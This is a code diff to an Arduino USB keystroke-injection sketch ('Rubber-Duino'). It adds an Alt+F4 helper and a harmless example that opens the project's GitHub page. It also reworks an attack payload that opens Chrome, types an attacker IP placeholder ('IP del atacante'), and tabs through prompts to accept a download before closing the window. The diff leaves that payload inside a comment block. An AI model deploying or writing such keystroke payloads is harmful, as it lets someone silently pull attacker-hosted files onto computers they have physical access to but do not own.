@@ -55,13 +55,25 @@ void ENTER();
 void WINDOWS(char *c);
 void CTRL_ALT_DEL();
 void ALT_F2();
+void ALT_F4();
 void TAB();
 
 void setup() {
   Serial.begin(9600);
   delay(200);
 
-  /**/
+  //----------Void Example ---------------- 
+  DELAY(1000);
+  WINDOWS("r");
+  DELAY(1000);
+  STRING("chrome.exe");
+  ENTER();
+  DELAY(2000);
+  STRING("github.com/TomasTexeira/Rubber-Duino");
+  ENTER();
+  //---------------------------------------
+
+  /*
   //----------Void auth key, sigin in your google account----------
   DELAY(1000);
   WINDOWS("r");
@@ -79,23 +91,34 @@ void setup() {
   ENTER();
   //---------------------------------------------------------------
 
+
 //or
 
   //--------------Void download_from_localhost-------------------
-  /*DELAY(1000);
+  DELAY(1000);
   WINDOWS("r");
   DELAY(1000);
   STRING("chrome.exe");
   ENTER();
-  DELAY(1000);
-  STRING("localhost:8080");
+  DELAY(2000);
+  STRING("IP del atacante");
   ENTER();
   DELAY(1000);
   TAB();
   ENTER();
-  coming soon
-  */
+  DELAY(1000);
+  TAB();
+  ENTER();
+  TAB();
+  TAB();
+  TAB();
+  TAB();
+  DELAY(1000);
+  ENTER();
+  DELAY(1000);
+  ALT_F4();
   //-------------------------------------------------------------
+*/
   }
 
   void loop() {
@@ -112,6 +135,15 @@ void setup() {
     Serial.write(buf, 8);
   }
 
+  void ALT_F4() {
+    buf[0] = KEY_LEFT_ALT;
+    buf[2] = KEY_F4;
+
+    Serial.write(buf, 8);       // Send keypress
+    buf[0] = 0; //clear memory
+    buf[2] = 0;
+    Serial.write(buf, 8);
+  }
 
   void STRING(char *txt) {
     while (*txt) {
